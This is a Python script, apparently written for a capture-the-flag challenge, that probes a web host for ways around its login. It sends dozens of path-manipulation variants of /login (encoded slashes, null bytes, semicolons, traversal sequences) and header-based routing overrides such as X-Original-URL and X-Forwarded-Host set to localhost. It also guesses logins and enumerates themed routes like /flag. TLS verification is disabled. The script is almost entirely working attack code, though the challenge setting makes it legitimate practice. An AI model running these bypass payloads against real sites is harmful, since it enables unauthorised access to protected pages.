import requests, urllib3, itertools
urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
base=f"https://{H}"
def probe(path, method="GET", headers=None, allow_redirects=False, data=None):
    try:
        r=requests.request(method, base+path, verify=False, timeout=3,
                           headers=headers or {}, allow_redirects=allow_redirects, data=data)
        return r.status_code, len(r.content), r.headers.get("Location",""), r.headers.get("Server","")
    except Exception as e:
        return "ERR", 0, str(e)[:60], ""

paths = [
 "/login/", "/login;", "/login;/", "/login;x", "/login%2f", "/login%00", "/login%0a",
 "/login./", "/./login", "/login/.", "/login/..", "/login/../", "/login/..;/",
 "/log%69n", "/%6cogin", "/LOGIN", "/Login", "/lOgin",
 "//login", "///login", "/;/login", "/%2flogin", "/%2e%2e/login", "/..%2flogin",
 "/login%2e", "/login%20", "/login\x00", "/login%09", "/login/;", ";/login",
 "/login?", "/login#", "/login\\", "/.//login", "/%252flogin",
]
print("== path variants ==")
for p in paths:
    s,l,loc,srv=probe(p)
    if s!="ERR" and not (s==404 and l==207) and l!=1481:
        print(f"  HIT {p!r} -> {s} {l} loc={loc} srv={srv}")
    elif s=="ERR":
        print(f"  ERR {p!r} -> {l}")

print("== header-based routing ==")
hdrs = [
 {"X-Original-URL":"/login"}, {"X-Rewrite-URL":"/login"}, {"X-Forwarded-Prefix":"/login"},
 {"X-Original-URI":"/login"}, {"X-Forwarded-Uri":"/login"}, {"X-Override-URL":"/login"},
 {"X-HTTP-Method-Override":"POST"}, {"X-Method-Override":"POST"},
 {"X-Forwarded-Host":"localhost"}, {"X-Forwarded-Host":"127.0.0.1"},
]
for h in hdrs:
    s,l,loc,srv=probe("/", headers=h)
    print(f"  / {h} -> {s} {l}")

print("== POST /login with various ==")
for data in [{"user":"admin"}, {"user":"grandma"}, {"name":"grandma"}]:
    s,l,loc,srv=probe("/login", method="POST", data=data)
    print(f"  POST /login {data} -> {s} {l} loc={loc}")

print("== trailing-slash themed routes ==")
themed=["admin","flag","grandma","granny","home","portal","dashboard","secret","recipe",
 "food","competition","sour","items","pickle","pickles","menu","kitchen","cook","chef","order"]
for w in themed:
    for suf in ["/",""]:
        p="/"+w+suf
        s,l,loc,srv=probe(p)
        if s!="ERR" and not (s==404 and l==207):
            print(f"  HIT {p!r} -> {s} {l} loc={loc}")
print("done")
